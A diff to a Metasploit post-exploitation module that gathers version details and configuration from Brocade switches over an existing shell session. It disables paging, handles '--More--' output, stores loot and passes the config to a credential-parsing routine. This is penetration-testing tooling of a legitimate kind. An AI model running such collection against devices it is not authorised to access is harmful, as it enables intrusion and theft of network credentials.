@@ -12,38 +12,39 @@ class MetasploitModule < Msf::Post
       'Name'          => 'Brocade Gather Device General Information',
       'Description'   => %q{
         This module collects Brocade device information and configuration.
+        This module has been tested against an icx6430 running 08.0.20T311.
         },
       'License'       => MSF_LICENSE,
       'Author'        => [ 'h00die'],
       'Platform'      => [ 'brocade'],
       'SessionTypes'  => [ 'shell' ]
     ))
-
-    register_options([])
-
   end
 
   def run
     # Get device prompt
-    prompt = session.shell_command("")
+    prompt = session.shell_command("\n")
 
     if prompt.end_with?('(config)#') # config shell
       vprint_status('In a config cli')
+      session.shell_write("skip-page-display\n")
+      session.shell_write("terminal length 0\n")
     elsif prompt.end_with?('#') # regular cli shell (non-config)
       vprint_status('In an enabled cli')
+      session.shell_write("skip-page-display\n")
+      session.shell_write("terminal length 0\n")
     elsif prompt.end_with?('>') # cli not enabled
       vprint_status('In a non-enabled cli')
-      session.shell_command('enable') # gets us back to the cli non-config
     end
 
-    # disable paging
-    session.shell_write('skip-page-display')
+    # attempt to disable paging, cli not enabled this will fail anyways
+    session.shell_write("skip-page-display\n")
+    session.shell_write("terminal length 0\n")
 
     # Get version info
     print_status('Getting version information')
-    version_out = session.shell_command('show version')
-
-    if /^, Version: (?<ver>.+) /i =~ version_out
+    version_out = session.shell_command("show version\n")
+    if /^, Version: (?<ver>.+) | SW: Version (?<ver>.+) /i =~ version_out
       vprint_status("OS: #{ver}")
     end
 
@@ -72,18 +73,23 @@ class MetasploitModule < Msf::Post
       },
     ]
     exec_commands.each do |ec|
-      command = command_prefix + ec['cmd']
+      command = ec['cmd']
       cmd_out = session.shell_command(command).gsub(/#{command}|#{prompt}/,"")
       print_status("Gathering info from #{command}")
-      cmd_loc = store_loot("brocade.#{ec['fn']}",
-        "text/plain",
-        session,
-        cmd_out.strip,
-        "#{ec['fn']}.txt",
-        ec['desc'])
-      vprint_good("Saving to #{cmd_loc}")
+      # detect if we're in pagination and get as much data as possible
+      if cmd_out.include?('--More--')
+        cmd_out += session.shell_command(" \n"*20) #20 pages *should* be enough
+      end
       if ec['fn'] == 'get_config'
-        brocades_config_eater(host,port,cmd_out.strip)
+        brocade_config_eater(host,port,cmd_out.strip)
+      else
+        cmd_loc = store_loot("brocade.#{ec['fn']}",
+          "text/plain",
+          session,
+          cmd_out.strip,
+          "#{ec['fn']}.txt",
+          ec['desc'])
+        vprint_good("Saving to #{cmd_loc}")
       end
     end
   end
